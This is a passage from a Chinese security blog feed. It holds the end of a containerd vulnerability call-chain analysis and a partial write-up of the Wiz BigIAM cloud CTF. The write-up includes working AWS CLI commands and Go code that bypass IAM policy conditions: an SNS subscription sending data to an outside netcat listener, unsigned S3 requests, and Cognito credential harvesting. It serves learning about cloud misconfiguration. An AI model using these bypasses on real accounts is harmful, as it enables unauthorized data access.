class="hljs-keyword">if</span> interceptor == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> srv.(RuntimeServiceServer).CreateContainer(ctx, in)<br>&#125;<br>info := &amp;grpc.UnaryServerInfo&#123;<br>Server:     srv,<br>FullMethod: <span class="hljs-string">&quot;/runtime.v1.RuntimeService/CreateContainer&quot;</span>,<br>&#125;<br>handler := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ctx context.Context, req <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (<span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">return</span> srv.(RuntimeServiceServer).CreateContainer(ctx, req.(*CreateContainerRequest))<br>&#125;<br><span class="hljs-keyword">return</span> interceptor(ctx, in, info, handler)<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数首先定义了一个grpc类，其对外提供的接口为”&#x2F;runtime.v1.RuntimeService&#x2F;CreateContainer”，处理函数为CreateContaienr函数，在CreateContainer函数中有这样的代码片段：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(volumeMounts) &gt; <span class="hljs-number">0</span> &#123;<br>mountMap := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> volumeMounts &#123;<br>mountMap[filepath.Clean(v.HostPath)] = v.ContainerPath<br>&#125;<br>opts = <span class="hljs-built_in">append</span>(opts, customopts.WithVolumes(mountMap))<br>&#125;<br></code></pre></td></tr></table></figure><p>该代码片段表示如果容器的Volume不为空的话，那么就将WithVolumes函数添加到opts中，而opts中的函数都会在下面的代码段中被传到NewContainer函数中并在该函数中被调用执行</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> cntr, err = c.client.NewContainer(ctx, id, opts...); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create containerd container: %w&quot;</span>, err)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *Client)</span></span> NewContainer(ctx context.Context, id <span class="hljs-type">string</span>, opts ...NewContainerOpts) (Container, <span class="hljs-type">error</span>) &#123;<br>...<br><span class="hljs-keyword">for</span> _, o := <span class="hljs-keyword">range</span> opts &#123;<br><span class="hljs-keyword">if</span> err := o(ctx, c, &amp;container); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是说，如果容器的volume不为空的话就会执行到WithVolumes函数。在上面的分析中我们得知WithVolumes就是存在漏洞的函数。至此该漏洞的调用链我们简单分析完毕，当containerd的”&#x2F;runtime.v1.RuntimeService&#x2F;CreateContainer”或“&#x2F;runtime.v1alpha2.RuntimeService&#x2F;CreateContainer”（runtime_alpha的RuntimeService中定义的接口）接口被调用时就会触发漏洞。</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>由于docker的创建容器的函数逻辑没有使用到containerd的接口，而是使用docker daemon中的处理逻辑，所以docker+containerd的架构下并不存在该漏洞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BIGIAM CTF writeup</title>
    <link href="/cllafrcog0003foutc7bgf017/"/>
    <url>/cllafrcog0003foutc7bgf017/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bigiamchallenge.com/challenge/1">wiz BigIAM CTF 挑战赛地址</a><br>一共六道题，都是给出IAM policy让你获取flag的形式，网页底部会提供一个终端，可以在该终端中运行aws cli</p><h2 id="Buckets-of-Fun"><a href="#Buckets-of-Fun" class="headerlink" title="Buckets of Fun"></a>Buckets of Fun</h2><p>第一题的policy如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>第一条权限语句表示允许所有人获取thebigiamchallenge-storage-9979f4b这个S3下的文件，第二条权限语句表示允许所有人列出thebigiamchallenge-storage-9979f4b这个S3下files下的文件列表。也就是说在该policy下，一个匿名用户可以知道thebigiamchallenge-storage-9979f4b这个S3下的files bucket有哪些文件并且可以读取其内容。<br>分析完policy，我们首先列出files下的所有文件<br><img src="/.com//BIGIAM-1.jpg"><br>此时，我们发现files下有一个flag1.txt，很明显flag就存放在这里。由于我们有GetObject的权限，所以我们直接访问即可拿到flag<br><img src="/.com//BIGIAM-2.jpg"></p><h2 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h2><p>第二题的policy如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;sqs:SendMessage&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;sqs:ReceiveMessage&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>通过该policy我们可以知道，此时我们拥有对<code>wiz-tbic-analytics-sqs-queue-ca7a1b2</code>这个sqs的发送信息和接受信息的权限。<br><strong>关于sqs：</strong><br>Amazon SQS是一个适用于微服务、分布式系统和无服务器应用程序的完全托管的消息队列，借助 Amazon Simple Queue Service（SQS），您可以在软件组件之间发送、存储和接收任何规模的消息，而不会丢失消息，并且无需其他服务即可保持可用。<br>所以猜测该题可能是通过sqs的ReceiveMessage权限收取信息，信息中应该会有flag。经过查阅<a href="https://docs.aws.amazon.com/zh_cn/cli/latest/reference/sqs/receive-message.html">sqs Receive文档</a>使用aws cli接收消息：<br><img src="/.com//bVc9bLQ"><br>在消息中有一个url，访问该url即可获得flag<br><img src="/.com//bVc9bM4"></p><h2 id="Enable-Push-Notifications"><a href="#Enable-Push-Notifications" class="headerlink" title="Enable Push Notifications"></a>Enable Push Notifications</h2><p>第三题的policy如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2008-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Statement1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;AWS&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;SNS:Subscribe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;sns:Endpoint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*@tbic.wiz.io&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>这条policy表示所有以@tbic.wiz.io为结尾的sns终端节点都有权限订阅名为<code>TBICWizPushNotifications</code>的sns<br><strong>关于sns：</strong><br>Amazon Simple Notification Service (Amazon SNS) 是一项托管服务，提供从发布者向订阅者（也称为创建者和使用者）的消息传输。发布者通过将消息发送至主题与订阅者进行异步交流，主题是一个逻辑访问点和通信渠道。客户端可以订阅 SNS 主题并使用受支持的终端节点类型接收已发布的消息，例如 Amazon Kinesis Data Firehose、Amazon SQS、AWS Lambda、HTTP、电子邮件、移动推送通知和移动短信 (SMS)。<br>通过查阅<a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">sns订阅aws cli官方文档</a>，我们发现， 订阅sns时aws cli需要指明以下几个参数</p><ul><li>–notification-endpoint 指明终端节点</li><li>–protocol 指明订阅后消息传输的协议</li><li>–topic-arn sns的arn信息</li></ul><p>topic-arn在题目中已经给出。当protocol为http或https时，终端节点是以http(s):&#x2F;&#x2F;开头的url，这样我们就可以指定使用http协议并且将终端节点设置为<a href="http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。">http://ip:port/@tbic.wiz.io的形式，这样就可以绕过policy的限制。</a><br>首先在一台有公网ip的机器上使用nc监听端口,之后使用aws cli执行下面的命令订阅sns</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol http --notification-endpoint http://xxx.xxx.xxx.xxxx:xxx/@tbic.wiz.io<br></code></pre></td></tr></table></figure><p>之后服务器上会接受到如下的消息：<br><img src="/.com//bVc9bQW"><br>由于我们采用的是http协议并且和sns所属的账号不是一个账号，所以还需要进行一步确认订阅的操作,确认订阅可直接访问上图中的SubscribeURL或者使用如下aws cli命令即可，其中token为上图中的token值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws sns confirm-subscription --topic-arn arn:xxxxxx --token xxxx<br></code></pre></td></tr></table></figure><p>确认订阅后监听的端口会返回flag<br><img src="/.com//bVc9bQ3"></p><h2 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h2><p>该题的policy如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Principal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Condition&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;s3:prefix&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;files/*&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;ForAllValues:StringLike&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;aws:PrincipalArn&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;arn:aws:iam::133713371337:user/admin&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以看到还是一个S3的policy。相比于第一题多了一个限制，只有aws:PrincipalArn为arn:aws:iam::133713371337:user&#x2F;admin时才可以使用ListBucket操作。这样第一题的操作就行不通了，我们需要绕过这个aws:PrincipalArn。通过查阅<a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_multi-value-conditions.html#reference_policies_multi-key-or-value-conditions">创建具有多个键或值的条件</a> 我们可以得知使用 ForAllValues 条件运算符时，如果请求中没有键或者键值解析为空数据集（如空字符串），则返回 true。如需要求该请求至少包含一个值，则您必须在策略中使用另一个条件。<br>所以我们只需要让aws:PrincipalArn为空即可，这里有两种方式，一是直接通过网页访问s3，二是使用aws cli 并且指定–no-sign-request。这里使用第二种方法进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request<br></code></pre></td></tr></table></figure><p><img src="/.com//bVc9bS7"><br>成功绕过，后续步骤和第一题差不多，直接获取flag-as-admin.txt的值即可<br><img src="/.com//bVc9bS8"></p><h2 id="Do-I-know-you"><a href="#Do-I-know-you" class="headerlink" title="Do I know you?"></a>Do I know you?</h2><p>该题的policy为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor0&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;mobileanalytics:PutEvents&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;cognito-sync:*&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;VisualEditor1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;s3:GetObject&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;s3:ListBucket&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;arn:aws:s3:::wiz-privatefiles/*&quot;</span><br>            <span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以发现该条policy是和AWS Cognito相关的<br><strong>关于AWS Cognito：</strong><br>Amazon Cognito 是 Web 和移动应用程序的身份平台。它是用户目录、身份验证服务器以及 OAuth 2.0 访问令牌和 AWS 凭证的授权服务。使用 Amazon Cognito，您可以对内置用户目录、企业目录以及 Google 和 Facebook 等使用者身份提供者中的用户进行身份验证和授权。要使用 Cognito 需要先创建一个 Amazon Cognito 身份池，然后填入创建的身份池 ID 去调用 SDK 获取临时凭证，最后通过临时凭证去操作资源。<br>首先我们要获取身份池ID，在网页源代码中我们发现了身份池ID<br><img src="/.com//bVc9bTt"><br>之后就可以调用sdk通过身份池ID获取临时凭证了，这里简单写了一份go获取临时凭证的代码</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getAKSKSessionToken</span><span class="hljs-params">(identity <span class="hljs-type">string</span>)</span></span> &#123;<br>identityPoolID := identity<br>region := <span class="hljs-string">&quot;us-east-1&quot;</span><br><br>sess, err := session.NewSession(&amp;aws.Config&#123;<br>Region: aws.String(region),<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error creating session:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>cognitoSvc := cognitoidentity.New(sess)<br><br>input := &amp;cognitoidentity.GetIdInput&#123;<br>IdentityPoolId: aws.String(identityPoolID),<br>&#125;<br><br>idResp, err := cognitoSvc.GetId(input)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error getting identity ID:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>identityID := aws.StringValue(idResp.IdentityId)<br><br>credsInput := &amp;cognitoidentity.GetCredentialsForIdentityInput&#123;<br>IdentityId: aws.String(identityID),<br>&#125;<br><br>credsResp, err := cognitoSvc.GetCredentialsForIdentity(credsInput)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error getting credentials:&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>accessKey := aws.StringValue(credsResp.Credentials.AccessKeyId)<br>secretKey := aws.StringValue(credsResp.Credentials.SecretKey)<br>sessionToken := aws.StringValue(credsResp.Credentials.SessionToken)<br><br>fmt.Printf(<span class="hljs-string">&quot;Access Key: %s\n&quot;</span>, accessKey)<br>fmt.Printf(<span class="hljs-string">&quot;Secret Key: %s\n&quot;</span>, secretKey)<br>fmt.Printf(<span class="hljs-string">&quot;Session Token: %s\n&quot;</span>, sessionToken)<br>&#125;<br></code></pre></td></tr></table></figure><p>将刚刚获得的身份池ID传给这个参数即可获得AK SK和Session Token，之后使用AK SK session Token即可操作s3。可以使用下面的命令配置AK SK SessionToken</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">aws configure set aws_access_key_id xxxx<br>aws configure set aws_secretss_access_key xxxx<br>aws configure set session_token xxxx <br></code></pre></td></tr></table></figure><p>配置好后直接使用aws cli读取policy中的s3即可</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang">aws s3 ls s3:<span class="hljs-comment">//wiz-privatefiles/</span><br>aws s3 cp s3:<span class="hljs-comment">//wiz-privatefiles/flag1.txt ./</span><br>cat flag.txt<br></code></pre></td></tr></table></figure><h2 id="One-final-push"><a href="#One-final-push" class="headerlink" title="One final push"></a>One final push</h2><p>此题的policy为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span 